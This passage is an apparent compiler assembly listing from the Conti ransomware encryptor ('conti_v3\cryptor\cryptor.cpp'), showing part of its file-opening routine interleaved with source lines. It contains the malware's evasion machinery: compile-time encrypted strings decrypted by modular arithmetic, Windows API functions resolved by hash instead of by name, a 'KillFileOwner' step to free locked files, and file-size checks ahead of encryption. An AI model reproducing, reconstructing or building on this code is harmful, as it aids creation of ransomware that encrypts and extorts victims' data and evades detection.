; 210  : 	return pFunction();

  007ef	44 8b c8	 mov	 r9d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  007f2	c6 45 e1 44	 mov	 BYTE PTR $T4[rbp-255], 68 ; 00000044H
  007f6	c6 45 e2 73	 mov	 BYTE PTR $T4[rbp-254], 115 ; 00000073H
  007fa	c6 45 e3 1c	 mov	 BYTE PTR $T4[rbp-253], 28
  007fe	c6 45 e4 73	 mov	 BYTE PTR $T4[rbp-252], 115 ; 00000073H
  00802	c6 45 e5 35	 mov	 BYTE PTR $T4[rbp-251], 53 ; 00000035H
  00806	c6 45 e6 73	 mov	 BYTE PTR $T4[rbp-250], 115 ; 00000073H
  0080a	c6 45 e7 3f	 mov	 BYTE PTR $T4[rbp-249], 63 ; 0000003fH
  0080e	c6 45 e8 73	 mov	 BYTE PTR $T4[rbp-248], 115 ; 00000073H
  00812	c6 45 e9 2d	 mov	 BYTE PTR $T4[rbp-247], 45 ; 0000002dH
  00816	c6 45 ea 73	 mov	 BYTE PTR $T4[rbp-246], 115 ; 00000073H
  0081a	c6 45 eb 1e	 mov	 BYTE PTR $T4[rbp-245], 30
  0081e	c6 45 ec 73	 mov	 BYTE PTR $T4[rbp-244], 115 ; 00000073H
  00822	c6 45 ed 5e	 mov	 BYTE PTR $T4[rbp-243], 94 ; 0000005eH
  00826	c6 45 ee 73	 mov	 BYTE PTR $T4[rbp-242], 115 ; 00000073H
  0082a	c6 45 ef 08	 mov	 BYTE PTR $T4[rbp-241], 8
  0082e	c6 45 f0 73	 mov	 BYTE PTR $T4[rbp-240], 115 ; 00000073H
  00832	c6 45 f1 41	 mov	 BYTE PTR $T4[rbp-239], 65 ; 00000041H
  00836	c6 45 f2 73	 mov	 BYTE PTR $T4[rbp-238], 115 ; 00000073H
  0083a	c6 45 f3 35	 mov	 BYTE PTR $T4[rbp-237], 53 ; 00000035H
  0083e	c6 45 f4 73	 mov	 BYTE PTR $T4[rbp-236], 115 ; 00000073H
  00842	c6 45 f5 1e	 mov	 BYTE PTR $T4[rbp-235], 30
  00846	c6 45 f6 73	 mov	 BYTE PTR $T4[rbp-234], 115 ; 00000073H
  0084a	c6 45 f7 6a	 mov	 BYTE PTR $T4[rbp-233], 106 ; 0000006aH
  0084e	c6 45 f8 73	 mov	 BYTE PTR $T4[rbp-232], 115 ; 00000073H
  00852	c6 45 f9 66	 mov	 BYTE PTR $T4[rbp-231], 102 ; 00000066H
  00856	c6 45 fa 73	 mov	 BYTE PTR $T4[rbp-230], 115 ; 00000073H
  0085a	c6 45 fb 62	 mov	 BYTE PTR $T4[rbp-229], 98 ; 00000062H
  0085e	c6 45 fc 73	 mov	 BYTE PTR $T4[rbp-228], 115 ; 00000073H
  00862	c6 45 fd 41	 mov	 BYTE PTR $T4[rbp-227], 65 ; 00000041H
  00866	c6 45 fe 73	 mov	 BYTE PTR $T4[rbp-226], 115 ; 00000073H
  0086a	c6 45 ff 1e	 mov	 BYTE PTR $T4[rbp-225], 30
  0086e	c6 45 00 73	 mov	 BYTE PTR $T4[rbp-224], 115 ; 00000073H
  00872	c6 45 01 6c	 mov	 BYTE PTR $T4[rbp-223], 108 ; 0000006cH
  00876	c6 45 02 73	 mov	 BYTE PTR $T4[rbp-222], 115 ; 00000073H
  0087a	c6 45 03 04	 mov	 BYTE PTR $T4[rbp-221], 4
  0087e	c6 45 04 73	 mov	 BYTE PTR $T4[rbp-220], 115 ; 00000073H
  00882	c6 45 05 60	 mov	 BYTE PTR $T4[rbp-219], 96 ; 00000060H
  00886	c6 45 06 73	 mov	 BYTE PTR $T4[rbp-218], 115 ; 00000073H
  0088a	c6 45 07 1e	 mov	 BYTE PTR $T4[rbp-217], 30
  0088e	c6 45 08 73	 mov	 BYTE PTR $T4[rbp-216], 115 ; 00000073H
  00892	c6 45 09 69	 mov	 BYTE PTR $T4[rbp-215], 105 ; 00000069H
  00896	c6 45 0a 73	 mov	 BYTE PTR $T4[rbp-214], 115 ; 00000073H
  0089a	c6 45 0b 41	 mov	 BYTE PTR $T4[rbp-213], 65 ; 00000041H
  0089e	c6 45 0c 73	 mov	 BYTE PTR $T4[rbp-212], 115 ; 00000073H
  008a2	c6 45 0d 2d	 mov	 BYTE PTR $T4[rbp-211], 45 ; 0000002dH
  008a6	c6 45 0e 73	 mov	 BYTE PTR $T4[rbp-210], 115 ; 00000073H
  008aa	c6 45 0f 38	 mov	 BYTE PTR $T4[rbp-209], 56 ; 00000038H
  008ae	c6 45 10 73	 mov	 BYTE PTR $T4[rbp-208], 115 ; 00000073H
  008b2	c6 45 11 1c	 mov	 BYTE PTR $T4[rbp-207], 28
  008b6	c6 45 12 73	 mov	 BYTE PTR $T4[rbp-206], 115 ; 00000073H
  008ba	c6 45 13 04	 mov	 BYTE PTR $T4[rbp-205], 4
  008be	c6 45 14 73	 mov	 BYTE PTR $T4[rbp-204], 115 ; 00000073H
  008c2	c6 45 15 2d	 mov	 BYTE PTR $T4[rbp-203], 45 ; 0000002dH
  008c6	c6 45 16 73	 mov	 BYTE PTR $T4[rbp-202], 115 ; 00000073H
  008ca	c6 45 17 17	 mov	 BYTE PTR $T4[rbp-201], 23
  008ce	c6 45 18 73	 mov	 BYTE PTR $T4[rbp-200], 115 ; 00000073H
  008d2	c6 45 19 5a	 mov	 BYTE PTR $T4[rbp-199], 90 ; 0000005aH
  008d6	c6 45 1a 73	 mov	 BYTE PTR $T4[rbp-198], 115 ; 00000073H
  008da	c6 45 1b 5a	 mov	 BYTE PTR $T4[rbp-197], 90 ; 0000005aH
  008de	c6 45 1c 73	 mov	 BYTE PTR $T4[rbp-196], 115 ; 00000073H
  008e2	c6 45 1d 5e	 mov	 BYTE PTR $T4[rbp-195], 94 ; 0000005eH
  008e6	c6 45 1e 73	 mov	 BYTE PTR $T4[rbp-194], 115 ; 00000073H
  008ea	c6 45 1f 5a	 mov	 BYTE PTR $T4[rbp-193], 90 ; 0000005aH
  008ee	c6 45 20 73	 mov	 BYTE PTR $T4[rbp-192], 115 ; 00000073H
  008f2	c6 45 21 1e	 mov	 BYTE PTR $T4[rbp-191], 30
  008f6	c6 45 22 73	 mov	 BYTE PTR $T4[rbp-190], 115 ; 00000073H
  008fa	c6 45 23 4c	 mov	 BYTE PTR $T4[rbp-189], 76 ; 0000004cH
  008fe	c6 45 24 73	 mov	 BYTE PTR $T4[rbp-188], 115 ; 00000073H
  00902	c6 45 25 1e	 mov	 BYTE PTR $T4[rbp-187], 30
  00906	c6 45 26 73	 mov	 BYTE PTR $T4[rbp-186], 115 ; 00000073H
  0090a	c6 45 27 6c	 mov	 BYTE PTR $T4[rbp-185], 108 ; 0000006cH
  0090e	c6 45 28 73	 mov	 BYTE PTR $T4[rbp-184], 115 ; 00000073H
  00912	c6 45 29 62	 mov	 BYTE PTR $T4[rbp-183], 98 ; 00000062H
  00916	c6 45 2a 73	 mov	 BYTE PTR $T4[rbp-182], 115 ; 00000073H
  0091a	c6 45 2b 56	 mov	 BYTE PTR $T4[rbp-181], 86 ; 00000056H
  0091e	c6 45 2c 73	 mov	 BYTE PTR $T4[rbp-180], 115 ; 00000073H
  00922	c6 45 2d 73	 mov	 BYTE PTR $T4[rbp-179], 115 ; 00000073H
  00926	c6 45 2e 73	 mov	 BYTE PTR $T4[rbp-178], 115 ; 00000073H
  0092a	0f b6 45 e1	 movzx	 eax, BYTE PTR $T4[rbp-255]

; 58   :         return m_isDecrypted;

  0092e	0f b6 45 e0	 movzx	 eax, BYTE PTR $T4[rbp-256]

; 63   :         if (!isDecrypted())

  00932	84 c0		 test	 al, al
  00934	75 5e		 jne	 SHORT $LN1306@OpenFileEn
  00936	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL1307@OpenFileEn:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00940	0f b6 4c 3d e1	 movzx	 ecx, BYTE PTR $T4[rbp+rdi-255]

; 40   :     return (a % n + n) % n;

  00945	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0094a	83 e9 73	 sub	 ecx, 115		; 00000073H
  0094d	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00951	41 f7 e8	 imul	 r8d
  00954	41 03 d0	 add	 edx, r8d
  00957	c1 fa 06	 sar	 edx, 6
  0095a	8b c2		 mov	 eax, edx
  0095c	c1 e8 1f	 shr	 eax, 31
  0095f	03 d0		 add	 edx, eax
  00961	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00964	44 2b c0	 sub	 r8d, eax
  00967	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0096c	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00970	41 f7 e8	 imul	 r8d
  00973	41 03 d0	 add	 edx, r8d
  00976	c1 fa 06	 sar	 edx, 6
  00979	8b c2		 mov	 eax, edx
  0097b	c1 e8 1f	 shr	 eax, 31
  0097e	03 d0		 add	 edx, eax
  00980	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00983	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00986	44 88 44 3d e1	 mov	 BYTE PTR $T4[rbp+rdi-255], r8b
  0098b	48 ff c7	 inc	 rdi
  0098e	48 83 ff 4e	 cmp	 rdi, 78			; 0000004eH
  00992	72 ac		 jb	 SHORT $LL1307@OpenFileEn
$LN1306@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 867  : 					logs::Write(OBFW(L"Can't open file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  00994	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  00997	48 8d 4d e1	 lea	 rcx, QWORD PTR $T4[rbp-255]
  0099b	45 8b c1	 mov	 r8d, r9d
  0099e	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 868  : 					return FALSE;

  009a3	e9 e5 05 00 00	 jmp	 $LN1358@OpenFileEn
$LN8@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  009a8	ba 0f 00 00 00	 mov	 edx, 15
  009ad	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  009b3	44 8d 4a 4e	 lea	 r9d, QWORD PTR [rdx+78]
  009b7	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  009bc	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  009be	40 88 bd f0 00
	00 00		 mov	 BYTE PTR $T6[rbp-256], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  009c5	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  009c8	c6 85 f1 00 00
	00 5f		 mov	 BYTE PTR $T6[rbp-255], 95 ; 0000005fH
  009cf	c6 85 f2 00 00
	00 0c		 mov	 BYTE PTR $T6[rbp-254], 12
  009d6	c6 85 f3 00 00
	00 34		 mov	 BYTE PTR $T6[rbp-253], 52 ; 00000034H
  009dd	c6 85 f4 00 00
	00 0c		 mov	 BYTE PTR $T6[rbp-252], 12
  009e4	c6 85 f5 00 00
	00 23		 mov	 BYTE PTR $T6[rbp-251], 35 ; 00000023H
  009eb	c6 85 f6 00 00
	00 0c		 mov	 BYTE PTR $T6[rbp-250], 12
  009f2	c6 85 f7 00 00
	00 23		 mov	 BYTE PTR $T6[rbp-249], 35 ; 00000023H
  009f9	c6 85 f8 00 00
	00 0c		 mov	 BYTE PTR $T6[rbp-248], 12
  00a00	c6 85 f9 00 00
	00 51		 mov	 BYTE PTR $T6[rbp-247], 81 ; 00000051H
  00a07	c6 85 fa 00 00
	00 0c		 mov	 BYTE PTR $T6[rbp-246], 12
  00a0e	c6 85 fb 00 00
	00 34		 mov	 BYTE PTR $T6[rbp-245], 52 ; 00000034H
  00a15	c6 85 fc 00 00
	00 0c		 mov	 BYTE PTR $T6[rbp-244], 12
  00a1c	c6 85 fd 00 00
	00 23		 mov	 BYTE PTR $T6[rbp-243], 35 ; 00000023H
  00a23	c6 85 fe 00 00
	00 0c		 mov	 BYTE PTR $T6[rbp-242], 12
  00a2a	c6 85 ff 00 00
	00 75		 mov	 BYTE PTR $T6[rbp-241], 117 ; 00000075H
  00a31	c6 85 00 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-240], 12
  00a38	c6 85 01 01 00
	00 1e		 mov	 BYTE PTR $T6[rbp-239], 30
  00a3f	c6 85 02 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-238], 12
  00a46	c6 85 03 01 00
	00 0f		 mov	 BYTE PTR $T6[rbp-237], 15
  00a4d	c6 85 04 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-236], 12
  00a54	c6 85 05 01 00
	00 42		 mov	 BYTE PTR $T6[rbp-235], 66 ; 00000042H
  00a5b	c6 85 06 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-234], 12
  00a62	c6 85 07 01 00
	00 75		 mov	 BYTE PTR $T6[rbp-233], 117 ; 00000075H
  00a69	c6 85 08 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-232], 12
  00a70	c6 85 09 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-231], 1
  00a77	c6 85 0a 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-230], 12
  00a7e	40 88 bd 0b 01
	00 00		 mov	 BYTE PTR $T6[rbp-229], dil
  00a85	c6 85 0c 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-228], 12
  00a8c	c6 85 0d 01 00
	00 45		 mov	 BYTE PTR $T6[rbp-227], 69 ; 00000045H
  00a93	c6 85 0e 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-226], 12
  00a9a	c6 85 0f 01 00
	00 12		 mov	 BYTE PTR $T6[rbp-225], 18
  00aa1	c6 85 10 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-224], 12
  00aa8	c6 85 11 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-223], 1
  00aaf	c6 85 12 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-222], 12
  00ab6	40 88 bd 13 01
	00 00		 mov	 BYTE PTR $T6[rbp-221], dil
  00abd	c6 85 14 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-220], 12
  00ac4	c6 85 15 01 00
	00 45		 mov	 BYTE PTR $T6[rbp-219], 69 ; 00000045H
  00acb	c6 85 16 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-218], 12
  00ad2	c6 85 17 01 00
	00 34		 mov	 BYTE PTR $T6[rbp-217], 52 ; 00000034H
  00ad9	c6 85 18 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-216], 12
  00ae0	c6 85 19 01 00
	00 23		 mov	 BYTE PTR $T6[rbp-215], 35 ; 00000023H
  00ae7	c6 85 1a 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-214], 12
  00aee	c6 85 1b 01 00
	00 75		 mov	 BYTE PTR $T6[rbp-213], 117 ; 00000075H
  00af5	c6 85 1c 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-212], 12
  00afc	40 88 bd 1d 01
	00 00		 mov	 BYTE PTR $T6[rbp-211], dil
  00b03	c6 85 1e 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-210], 12
  00b0a	c6 85 1f 01 00
	00 0e		 mov	 BYTE PTR $T6[rbp-209], 14
  00b11	c6 85 20 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-208], 12
  00b18	c6 85 21 01 00
	00 50		 mov	 BYTE PTR $T6[rbp-207], 80 ; 00000050H
  00b1f	c6 85 22 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-206], 12
  00b26	40 88 bd 23 01
	00 00		 mov	 BYTE PTR $T6[rbp-205], dil
  00b2d	c6 85 24 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-204], 12
  00b34	c6 85 25 01 00
	00 0b		 mov	 BYTE PTR $T6[rbp-203], 11
  00b3b	c6 85 26 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-202], 12
  00b42	40 88 bd 27 01
	00 00		 mov	 BYTE PTR $T6[rbp-201], dil
  00b49	c6 85 28 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-200], 12
  00b50	c6 85 29 01 00
	00 75		 mov	 BYTE PTR $T6[rbp-199], 117 ; 00000075H
  00b57	c6 85 2a 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-198], 12
  00b5e	c6 85 2b 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-197], 1
  00b65	c6 85 2c 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-196], 12
  00b6c	c6 85 2d 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-195], 1
  00b73	c6 85 2e 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-194], 12
  00b7a	c6 85 2f 01 00
	00 12		 mov	 BYTE PTR $T6[rbp-193], 18
  00b81	c6 85 30 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-192], 12
  00b88	c6 85 31 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-191], 1
  00b8f	c6 85 32 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-190], 12
  00b96	c6 85 33 01 00
	00 5a		 mov	 BYTE PTR $T6[rbp-189], 90 ; 0000005aH
  00b9d	c6 85 34 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-188], 12
  00ba4	40 88 bd 35 01
	00 00		 mov	 BYTE PTR $T6[rbp-187], dil
  00bab	c6 85 36 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-186], 12
  00bb2	c6 85 37 01 00
	00 21		 mov	 BYTE PTR $T6[rbp-185], 33 ; 00000021H
  00bb9	c6 85 38 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-184], 12
  00bc0	c6 85 39 01 00
	00 75		 mov	 BYTE PTR $T6[rbp-183], 117 ; 00000075H
  00bc7	c6 85 3a 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-182], 12
  00bce	c6 85 3b 01 00
	00 20		 mov	 BYTE PTR $T6[rbp-181], 32 ; 00000020H
  00bd5	c6 85 3c 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-180], 12
  00bdc	c6 85 3d 01 00
	00 2f		 mov	 BYTE PTR $T6[rbp-179], 47 ; 0000002fH
  00be3	c6 85 3e 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-178], 12
  00bea	c6 85 3f 01 00
	00 37		 mov	 BYTE PTR $T6[rbp-177], 55 ; 00000037H
  00bf1	c6 85 40 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-176], 12
  00bf8	c6 85 41 01 00
	00 50		 mov	 BYTE PTR $T6[rbp-175], 80 ; 00000050H
  00bff	c6 85 42 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-174], 12
  00c06	c6 85 43 01 00
	00 20		 mov	 BYTE PTR $T6[rbp-173], 32 ; 00000020H
  00c0d	c6 85 44 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-172], 12
  00c14	c6 85 45 01 00
	00 02		 mov	 BYTE PTR $T6[rbp-171], 2
  00c1b	c6 85 46 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-170], 12
  00c22	c6 85 47 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-169], 1
  00c29	c6 85 48 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-168], 12
  00c30	c6 85 49 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-167], 1
  00c37	c6 85 4a 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-166], 12
  00c3e	c6 85 4b 01 00
	00 12		 mov	 BYTE PTR $T6[rbp-165], 18
  00c45	c6 85 4c 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-164], 12
  00c4c	c6 85 4d 01 00
	00 01		 mov	 BYTE PTR $T6[rbp-163], 1
  00c53	c6 85 4e 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-162], 12
  00c5a	40 88 bd 4f 01
	00 00		 mov	 BYTE PTR $T6[rbp-161], dil
  00c61	c6 85 50 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-160], 12
  00c68	c6 85 51 01 00
	00 05		 mov	 BYTE PTR $T6[rbp-159], 5
  00c6f	c6 85 52 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-158], 12
  00c76	40 88 bd 53 01
	00 00		 mov	 BYTE PTR $T6[rbp-157], dil
  00c7d	c6 85 54 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-156], 12
  00c84	c6 85 55 01 00
	00 0e		 mov	 BYTE PTR $T6[rbp-155], 14
  00c8b	c6 85 56 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-154], 12
  00c92	c6 85 57 01 00
	00 23		 mov	 BYTE PTR $T6[rbp-153], 35 ; 00000023H
  00c99	c6 85 58 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-152], 12
  00ca0	c6 85 59 01 00
	00 6f		 mov	 BYTE PTR $T6[rbp-151], 111 ; 0000006fH
  00ca7	c6 85 5a 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-150], 12
  00cae	c6 85 5b 01 00
	00 5a		 mov	 BYTE PTR $T6[rbp-149], 90 ; 0000005aH
  00cb5	c6 85 5c 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-148], 12
  00cbc	c6 85 5d 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-147], 12
  00cc3	c6 85 5e 01 00
	00 0c		 mov	 BYTE PTR $T6[rbp-146], 12
  00cca	0f b6 85 f1 00
	00 00		 movzx	 eax, BYTE PTR $T6[rbp-255]

; 58   :         return m_isDecrypted;

  00cd1	0f b6 85 f0 00
	00 00		 movzx	 eax, BYTE PTR $T6[rbp-256]

; 63   :         if (!isDecrypted())

  00cd8	84 c0		 test	 al, al
  00cda	75 59		 jne	 SHORT $LN962@OpenFileEn
  00cdc	0f 1f 40 00	 npad	 4
$LL963@OpenFileEn:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00ce0	0f b6 8c 3d f1
	00 00 00	 movzx	 ecx, BYTE PTR $T6[rbp+rdi-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00ce8	b8 0c 00 00 00	 mov	 eax, 12
  00ced	2b c1		 sub	 eax, ecx
  00cef	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00cf2	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00cf7	f7 e9		 imul	 ecx
  00cf9	03 d1		 add	 edx, ecx
  00cfb	c1 fa 06	 sar	 edx, 6
  00cfe	8b c2		 mov	 eax, edx
  00d00	c1 e8 1f	 shr	 eax, 31
  00d03	03 d0		 add	 edx, eax
  00d05	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00d08	2b c8		 sub	 ecx, eax
  00d0a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00d0f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00d12	f7 e9		 imul	 ecx
  00d14	03 d1		 add	 edx, ecx
  00d16	c1 fa 06	 sar	 edx, 6
  00d19	8b c2		 mov	 eax, edx
  00d1b	c1 e8 1f	 shr	 eax, 31
  00d1e	03 d0		 add	 edx, eax
  00d20	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00d23	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00d25	88 8c 3d f1 00
	00 00		 mov	 BYTE PTR $T6[rbp+rdi-255], cl
  00d2c	48 ff c7	 inc	 rdi
  00d2f	48 83 ff 6e	 cmp	 rdi, 110		; 0000006eH
  00d33	72 ab		 jb	 SHORT $LL963@OpenFileEn
$LN962@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 875  : 				logs::Write(OBFW(L"KillFileOwner for file %s - error. GetLastError = %lu."), FileInfo->Filename, pGetLastError());

  00d35	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  00d38	48 8d 8d f1 00
	00 00		 lea	 rcx, QWORD PTR $T6[rbp-255]
  00d3f	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 876  : 				return FALSE;

  00d44	e9 44 02 00 00	 jmp	 $LN1358@OpenFileEn
$LN6@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 102  : 	pFunction = (BOOL(WINAPI*)(HANDLE, PLARGE_INTEGER))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x43ba1ffb, 104);//GetProcAddress(hKernel32, OBFA("GetFileSizeEx"));

  00d49	ba 0f 00 00 00	 mov	 edx, 15
  00d4e	41 b8 fb 1f ba
	43		 mov	 r8d, 1136271355		; 43ba1ffbH
  00d54	44 8d 4a 59	 lea	 r9d, QWORD PTR [rdx+89]
  00d58	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 103  : 	return pFunction(hFile, lpFileSize);

  00d5d	48 8d 95 60 01
	00 00		 lea	 rdx, QWORD PTR FileSize$[rbp-256]
  00d64	48 8b cb	 mov	 rcx, rbx
  00d67	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 891  : 	if (!pGetFileSizeEx(FileInfo->FileHandle, &FileSize) || !FileSize.QuadPart) {

  00d69	85 c0		 test	 eax, eax
  00d6b	74 1a		 je	 SHORT $LN12@OpenFileEn
  00d6d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR FileSize$[rbp-256]
  00d74	48 85 c0	 test	 rax, rax
  00d77	74 0e		 je	 SHORT $LN12@OpenFileEn

; 895  : 		return FALSE;
; 896  : 
; 897  : 	}
; 898  : 
; 899  : 	FileInfo->FileSize = FileSize.QuadPart;

  00d79	48 89 46 10	 mov	 QWORD PTR [rsi+16], rax

; 900  : 	return TRUE;

  00d7d	b8 01 00 00 00	 mov	 eax, 1
  00d82	e9 08 02 00 00	 jmp	 $LN1@OpenFileEn
$LN12@OpenFileEn:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  00d87	ba 0f 00 00 00	 mov	 edx, 15
  00d8c	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00d92	44 8d 4a 4e	 lea	 r9d, QWORD PTR [rdx+78]
  00d96	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  00d9b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00d9d	40 88 7d 30	 mov	 BYTE PTR $T10[rbp-256], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  00da1	44 8b c8	 mov	 r9d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00da4	c6 45 31 73	 mov	 BYTE PTR $T10[rbp-255], 115 ; 00000073H
  00da8	c6 45 32 3a	 mov	 BYTE PTR $T10[rbp-254], 58 ; 0000003aH
  00dac	c6 45 33 17	 mov	 BYTE PTR $T10[rbp-253], 23
  00db0	c6 45 34 3a	 mov	 BYTE PTR $T10[rbp-252], 58 ; 0000003aH
  00db4	c6 45 35 11	 mov	 BYTE PTR $T10[rbp-251], 17
  00db8	c6 45 36 3a	 mov	 BYTE PTR $T10[rbp-250], 58 ; 0000003aH
  00dbc	c6 45 37 28	 mov	 BYTE PTR $T10[rbp-249], 40 ; 00000028H
  00dc0	c6 45 38 3a	 mov	 BYTE PTR $T10[rbp-248], 58 ; 0000003aH
  00dc4	c6 45 39 18	 mov	 BYTE PTR $T10[rbp-247], 24
  00dc8	c6 45 3a 3a	 mov	 BYTE PTR $T10[rbp-246], 58 ; 0000003aH
  00dcc	c6 45 3b 35	 mov	 BYTE PTR $T10[rbp-245], 53 ; 00000035H
  00dd0	c6 45 3c 3a	 mov	 BYTE PTR $T10[rbp-244], 58 ; 0000003aH
  00dd4	c6 45 3d 1e	 mov	 BYTE PTR $T10[rbp-243], 30
  00dd8	c6 45 3e 3a	 mov	 BYTE PTR $T10[rbp-242], 58 ; 0000003aH
  00ddc	c6 45 3f 46	 mov	 BYTE PTR $T10[rbp-241], 70 ; 00000046H
  00de0	c6 45 40 3a	 mov	 BYTE PTR $T10[rbp-240], 58 ; 0000003aH
  00de4	c6 45 41 18	 mov	 BYTE PTR $T10[rbp-239], 24
